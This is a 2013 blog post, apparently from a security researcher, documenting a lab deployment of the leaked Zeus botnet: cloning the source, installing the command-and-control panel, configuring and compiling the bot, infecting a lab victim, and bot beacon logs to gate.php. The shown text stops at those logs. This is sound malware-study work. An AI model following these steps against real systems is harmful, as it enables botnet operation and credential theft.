@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Zeus My Adventure with a Infamous Bot | #!/slash/note</title>
+  <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="Zeus My Adventure with a Infamous Bot" />
+<meta property="og:description" content="NOTE! THIS IS FOR EDUCATIONAL PURPOSES ONLY. CHANCES ARE, IF YOU TRY THIS WITHOUT PERMISSION, YOU WILL GET CAUGHT AND GET THROWN INTO A DARK PLACE WITH NO INTERNET
+Bots for the masses.
+Recently at a conference that I attended, I sat in a class that was talking about Botnets and general &lsquo;How Easy They Are&rsquo; related things. 90% of the technical discussions did not really come as a surprise to me, however, I came to realize that I am not 100% aware of how ( and I dare say this lightly ) easy they have it. The technical competency of the adversary really doesn&rsquo;t have to be at a jaw droppingly high level. In fact, if you can operate the keyboard and mouse, heck, even a tablet/phone once its all setup, then you could potentially be a successful botnet operator." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://leonjza.github.io/posts/2013-09-23-zeus-my-adventure-with-a-infamous-bot/" />
+<meta property="article:published_time" content="2013-09-23T00:00:00+00:00" />
+<meta property="article:modified_time" content="2013-09-23T00:00:00+00:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Zeus My Adventure with a Infamous Bot"/>
+<meta name="twitter:description" content="NOTE! THIS IS FOR EDUCATIONAL PURPOSES ONLY. CHANCES ARE, IF YOU TRY THIS WITHOUT PERMISSION, YOU WILL GET CAUGHT AND GET THROWN INTO A DARK PLACE WITH NO INTERNET
+Bots for the masses.
+Recently at a conference that I attended, I sat in a class that was talking about Botnets and general &lsquo;How Easy They Are&rsquo; related things. 90% of the technical discussions did not really come as a surprise to me, however, I came to realize that I am not 100% aware of how ( and I dare say this lightly ) easy they have it. The technical competency of the adversary really doesn&rsquo;t have to be at a jaw droppingly high level. In fact, if you can operate the keyboard and mouse, heck, even a tablet/phone once its all setup, then you could potentially be a successful botnet operator."/>
+
+  
+  
+  
+  <link rel="stylesheet" href="https://leonjza.github.io/css/style-white.css">
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.png" />
+
+  
+  
+  
+  
+  
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-44457032-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="https://leonjza.github.io/">Home</a></li>
+         
+        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://leonjza.github.io/posts/2013-08-03-kvm-redirecting-centos-kernel-and-tty-output-to-a-virtual-serial-console/">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://leonjza.github.io/posts/2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&text=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&title=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&is_video=false&description=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&title=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&title=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&title=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot">
+      <i class="fab fa-stumbleupon " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&title=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot">
+      <i class="fab fa-digg " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&name=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot&description=%3cp%3e%3cstrong%3eNOTE%21%20THIS%20IS%20FOR%20EDUCATIONAL%20PURPOSES%20ONLY.%20CHANCES%20ARE%2c%20IF%20YOU%20TRY%20THIS%20WITHOUT%20PERMISSION%2c%20YOU%20WILL%20GET%20CAUGHT%20AND%20GET%20THROWN%20INTO%20A%20DARK%20PLACE%20WITH%20NO%20INTERNET%3c%2fstrong%3e%3c%2fp%3e%0a%3ch3%20id%3d%22bots-for-the-masses%22%3eBots%20for%20the%20masses.%3c%2fh3%3e%0a%3cp%3eRecently%20at%20a%20conference%20that%20I%20attended%2c%20I%20sat%20in%20a%20class%20that%20was%20talking%20about%20Botnets%20and%20general%20%26lsquo%3bHow%20Easy%20They%20Are%26rsquo%3b%20related%20things.%2090%25%20of%20the%20technical%20discussions%20did%20not%20really%20come%20as%20a%20surprise%20to%20me%2c%20however%2c%20I%20came%20to%20realize%20that%20I%20am%20not%20%3cstrong%3e100%25%3c%2fstrong%3e%20aware%20of%20how%20%28%20and%20I%20dare%20say%20this%20lightly%20%29%20%3cem%3eeasy%3c%2fem%3e%20they%20have%20it.%20The%20technical%20competency%20of%20the%20adversary%20really%20doesn%26rsquo%3bt%20have%20to%20be%20at%20a%20jaw%20droppingly%20high%20level.%20In%20fact%2c%20if%20you%20can%20operate%20the%20keyboard%20and%20mouse%2c%20heck%2c%20even%20a%20tablet%2fphone%20once%20its%20all%20setup%2c%20then%20you%20could%20potentially%20be%20a%20successful%20botnet%20operator.%3c%2fp%3e">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&t=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#bots-for-the-masses">Bots for the masses.</a></li>
+        <li><a href="#so-botnet">So, botnet?</a></li>
+        <li><a href="#the-zeus-bot-architecture">The Zeus Bot Architecture</a></li>
+        <li><a href="#zeus-source-leaked">Zeus Source Leaked</a></li>
+        <li><a href="#lab-time">LAB Time!</a></li>
+        <li><a href="#the-configuration">The Configuration</a>
+          <ul>
+            <li><a href="#command--control">Command &amp; Control</a></li>
+            <li><a href="#installing-the-command--control">Installing the Command &amp; Control</a></li>
+            <li><a href="#compiling-the-bot">Compiling the Bot</a></li>
+          </ul>
+        </li>
+        <li><a href="#skipping-the-creative-parts---infection">Skipping the creative parts - Infection.</a></li>
+        <li><a href="#from-the-bot-herders-perspective">From the Bot Herders Perspective</a>
+          <ul>
+            <li><a href="#but-thats-not-all">But thats not all</a></li>
+            <li><a href="#execute-the-vnc-bc-script">Execute the VNC BC Script</a></li>
+          </ul>
+        </li>
+        <li><a href="#web-injects-the-real-threat">Web Injects, the real threat.</a>
+          <ul>
+            <li><a href="#how-it-works">How it works</a></li>
+          </ul>
+        </li>
+        <li><a href="#summary">Summary</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        Zeus My Adventure with a Infamous Bot
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2013-09-23 00:00:00 &#43;0000 UTC" itemprop="datePublished">2013-09-23</time>
+          
+        </div>
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="https://leonjza.github.io/categories/zeus">zeus</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/bot">bot</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/lab">lab</a>
+            
+        </div>
+        
+        
+      </div>
+    </header>
+
+  
+    <div class="content" itemprop="articleBody">
+      <p><strong>NOTE! THIS IS FOR EDUCATIONAL PURPOSES ONLY. CHANCES ARE, IF YOU TRY THIS WITHOUT PERMISSION, YOU WILL GET CAUGHT AND GET THROWN INTO A DARK PLACE WITH NO INTERNET</strong></p>
+<h3 id="bots-for-the-masses">Bots for the masses.</h3>
+<p>Recently at a conference that I attended, I sat in a class that was talking about Botnets and general &lsquo;How Easy They Are&rsquo; related things. 90% of the technical discussions did not really come as a surprise to me, however, I came to realize that I am not <strong>100%</strong> aware of how ( and I dare say this lightly ) <em>easy</em> they have it. The technical competency of the adversary really doesn&rsquo;t have to be at a jaw droppingly high level. In fact, if you can operate the keyboard and mouse, heck, even a tablet/phone once its all setup, then you could potentially be a successful botnet operator.</p>
+<h3 id="so-botnet">So, botnet?</h3>
+<p>In its simplest form, a bot, from an attackers perspective, is simply a part of a larger resource network. A number, that if not available, does not really matter as there are many more that form part of the larger botnet. A very well known botnet is the [Zeus botnet](<a href="https://en.wikipedia.org/wiki/Zeus_(malware">https://en.wikipedia.org/wiki/Zeus_(malware</a>)). Popular for its ability to perform credential theft, it was sold from what appears to range from $700 to $15000, depending on the extra <em>features</em> that you&rsquo;d like. Some of these features include the ability to connect via VNC to a remote host in order to graphically control it.</p>
+<p>So for $700, you can buy a relatively easy to setup piece of software that would allow you to <em>steal</em> credentials from random victims. This activity is only one part of a larger cybertheft cycle. The wikipedia article [here](<a href="https://en.wikipedia.org/wiki/Zeus_(malware">https://en.wikipedia.org/wiki/Zeus_(malware</a>)) does a excellent job to describe the process in a image:</p>
+<figure>
+    <img src="https://leonjza.github.io/images/zues_fraud_scheme.jpg"/> 
+</figure>
+
+<h3 id="the-zeus-bot-architecture">The Zeus Bot Architecture</h3>
+<p>The Zeus bot client side software is a windows only piece of malware. Typically infection would occur via a <a href="http://en.wikipedia.org/wiki/Drive-by_download">drive-by download</a> (which is the scariest and possibly most stealthy form of infection), or via other means such as facebook posts, phishing sites etc, enticing the user to run an arbitrary executable. Of course, infection is not limited to these methods. Simply getting access to a computer, plugging in your thumbdrive and running the bot software is a completely valid form of infection.</p>
+<p>Once infection is successful, the client runs silently on the victim PC, masking itself as much as possible. The client would have a time configured that tells it how often it should update the Command and Control server with new collected information, as well as dynamic configuration updates, new commands it should run and keep-alive check-ins.</p>
+<h3 id="zeus-source-leaked">Zeus Source Leaked</h3>
+<p>The full Zeus bot sources <a href="https://www.csis.dk/en/csis/blog/3229/">leaked</a> around March 2011, and a Github repo of it was made <a href="https://github.com/Visgean/Zeus">here</a>. This allowed any one in the public to dissect, inspect and test the Malware. This was probably not a good thing for the malware authors' business :). However, now, anyone is able to grab the sources, modify it as required and use. It leads to the possibility of even more sophistication in a already successful botnet, such as adding peer-to-peer communications with C&amp;C servers instead of relying on HTTP as can be seen in <a href="http://www.cert.pl/PDF/2013-06-p2p-rap_en.pdf">this</a> excellent analysis by <a href="https://twitter.com/CERT_Polska_en">@CERT_Polska_en</a>.</p>
+<h3 id="lab-time">LAB Time!</h3>
+<p>Now that we have the full sources, I decided it&rsquo;s time to setup a LAB to configure and play with this bot.</p>
+<p>I have a KVM Server at my disposal, and figured it will be a good idea to use that. The basic idea of the lab was to have a simulated internet network, a firewall, and a client network that makes use of this &ldquo;Fake Internet&rdquo;. I created 2 isolated networks, configured a set of CentOS 6, and Windows XP clients and a Server 2008 R2 Server.</p>
+<p>In short, the lab was going to look something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+                         Virtual Machine Management Interface
+                         +-----------------------------------&gt;
+                                   |
+                                   |
+                                   |
+                              +----+---------+
+                              |              |
+                  +-----------+  Firewall    +-----------+
+                  |           |              |           |
+                  |           +--------------+           |
+                  |                                      |                 +----------+
+                  |                  ^                   |              +--| Victim A |
+          +---------------+          |           +----------------+     |  +----------+
+          |               |          |           |                |     |
+          | Fake Internet |          +           |   Fake LAN     +-----+  +----------+
+          |               |                      |                |     +--+ Victim B |
+          +------+--------+   NAT Towards Fake   +----------------+        +----------+
+                 |            Internet Interface
+                 |
+        +--------+--------+--------------------+----------------+
+        |                 |                    |                |
+        |                 |                    |                |
+        |                 |                    |                +
+ +------+-----+     +-----+------+      +------+-------+     +-----------------+
+ |            |     |            |      |              |     |                 |
+ | Zeus Bot   |     | Zeus Web   |      | Random Victim|     | Compromised     |
+ | Herder /   |     | based C&amp;C  |      |              |     | Web Server      |
+ | Controller |     |            |      |              |     |                 |
+ +------------+     +------------+      +--------------+     +-----------------+
+</code></pre></div><h3 id="the-configuration">The Configuration</h3>
+<h4 id="command--control">Command &amp; Control</h4>
+<p>I figured I&rsquo;d start by checking out the code from the <a href="https://github.com/Visgean/Zeus/">git</a> repo onto the server I would use as the command and control server. So, off I went and <code>git clone https://github.com/Visgean/Zeus.git</code>&rsquo;d the Zeus code into a local directory of my C&amp;C server.</p>
+<p>The folder structure of the directory <code>output</code> that is of interest, on disk, looked something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Zeus/output
+├── builder
+├── other
+├── server
+└── server<span style="color:#ff79c6">[</span>php<span style="color:#ff79c6">]</span>
+    ├── install
+    ├── system
+    └── theme
+</code></pre></div><p>We can see there is a <code>server[php]</code> directory, which is rather obvious that this is the web interface code. Quick inspection of the sources revealed that the common directory index <code>index.php</code> is in fact empty. So, should someone stumble upon the C&amp;C directory, a blank page will be displayed to the user.</p>
+<p>Two other files also exist in the php server root, namely <code>cp.php</code> and <code>gate.php</code>. <code>cp.php</code> is the user control panel to manage the bots, whereas <code>gate.php</code> is the script that all the bots will use to communicate with the C&amp;C. That being said, inspecting network traffic should reveal a lot of talking with <code>gate.php</code>. As a side note, the comments in the sources are in Russian, which makes for a interesting time with Google Translate to read them ;)</p>
+<p>So, I copied the sources for <code>server[php]</code> to a web folder <code>z/</code>, fixed up the SELinux contexts for them and tried to access the <code>cp.php</code> page. Bam, server error.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># Zeus cp.php mb_internal_encoding error</span>
+<span style="color:#ff79c6">[</span>Mon Sep <span style="color:#bd93f9">23</span> 10:57:45 2013<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>error<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>client 172.16.50.1<span style="color:#ff79c6">]</span> PHP Fatal error:  Call to undefined <span style="color:#ff79c6">function</span> mb_internal_encoding<span style="color:#ff79c6">()</span> in /var/www/html/z/system/global.php on line <span style="color:#bd93f9">1</span>
+</code></pre></div><p>It was pretty obvious I was missing <code>php-mbstring</code>, so I went and installed it and restarted Apache. Now, loading my <code>cp.php</code>, I was greeted with a polite message asking me how I am :D</p>
+<figure>
+    <img src="https://leonjza.github.io/images/zues_cp.png"/> 
+</figure>
+
+<h4 id="installing-the-command--control">Installing the Command &amp; Control</h4>
+<p>I noticed a install folder in the obtained sources and browsed to <code>install/</code> and found a very nice, easy to understand installer:</p>
+<figure>
+    <img src="https://leonjza.github.io/images/zues_cp_install.png"/> 
+</figure>
+
+<p>Here I realized I needed to have a mysql server running, so I proceeded to install that too and create a database <code>cpdb</code> for the control panel. From here, it was literally a case of install and login. We now have a working Zeus command and control server. That really was not so hard was it? In fact, its worryingly easy.</p>
+<figure>
+    <img src="https://leonjza.github.io/images/zues_cp_internal.png"/> 
+</figure>
+
+<h4 id="compiling-the-bot">Compiling the Bot</h4>
+<p>With that out of the way, the next step had to be to compile the Zeus bot binary with which we will be infecting the Lab of fake LAN clients. For this a Windows machine was required as the tools for this are all windows based. I fired up a Windows XP Virtual Machine, and grabbed a copy of the Zeus code from the Github repository again.</p>
+<p>Next, I browsed to the <code>output/builder/</code> folder again and opened the <code>config.txt</code> file in notepad. Here, I really had to set minimal options. One to specify the location of the <code>config.bin</code> and the others for the location of updated bot binaries and what URL the Command and Control server lives at. All pretty straight forward. I also had to set the <code>encryption_key</code>, which should correspond to the key used when we installed the server side PHP stuff earlier.</p>
+<figure>
+    <img src="https://leonjza.github.io/images/zues_compiler_config.png"/> 
+</figure>
+
+<p>The next step was to <em>compile</em> the bot. While this may sound complex, it&rsquo;s not. In fact, 2 clicks, granted the config files syntax is correct, and you will have a working compiled exe to work with. The <strong>compiler</strong> interface looked like this:</p>
+<figure>
+    <img src="https://leonjza.github.io/images/zues_bot_compiler.png"/> 
+</figure>
+
+<p>1,2,3 done. We now have a <code>zeus-bot.exe</code>. The malware is now customized to speak to my Command &amp; Control server using my unique encryption key. Again, up until this point everything has been pretty easy and straight forward.</p>
+<h3 id="skipping-the-creative-parts---infection">Skipping the creative parts - Infection.</h3>
+<p>From here the infection phase pretty much starts. Of course, the bot herder would need to test hes executables and ensure that they are in working order. There is no point in distributing malware that doesn&rsquo;t work eh. ;D With infection, as previously mentioned anything goes. From drive-by downloads to phishing to physical access to a server. If the machine can execute the bot executable, its job done.</p>
+<p>Sadly, I wanted to test the <a href="http://en.wikipedia.org/wiki/Blackhole_exploit_kit">Blackhole Exploit Kit</a>, but the resources on the net appear to be rather scarce. That and the fact that the available versions of it are encoded using a PHP encoder (IonCube), makes it a tad more difficult to get going. It was however interesting to see that the malware authors are limiting they software to IP&rsquo;s along with time restrictions the works. Just like something you&rsquo;d expect to see in commercial software.</p>
+<p>As I am kind of the only person using this network, there is no point in trying to fool me into getting the executable run. To make it easy for me to rerun it, I uploaded <code>zeus-bot.exe</code> and the encrypted <code>config.bin</code> to a fake <strong>compromised web server</strong>, ready for download.</p>
+<p>I opened Internet Explorer and browsed to the location of <code>zeus-bot.exe</code> and chose <strong>RUN</strong>. To the unsuspecting user, it will appear that nothing happened&hellip;</p>
+<h3 id="from-the-bot-herders-perspective">From the Bot Herders Perspective</h3>
+<p>Assuming the position of the evil bot herder now, I am able to see that I have a new bot connected to my Command &amp; Control server. We can see this in the interface, as well as based on the POST requests to <code>gate.php</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># Apache Logs Extract for POST&#39;s to gate.php</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:10:58:01 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:10:58:06 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:10:58:12 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:10:58:17 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:10:58:22 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:10:59:00 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:10:59:05 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:10:59:10 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:10:59:15 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:10:59:20 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:10:59:23 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:10:59:28 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:10:59:34 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:10:59:39 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:10:59:44 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:11:00:20 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
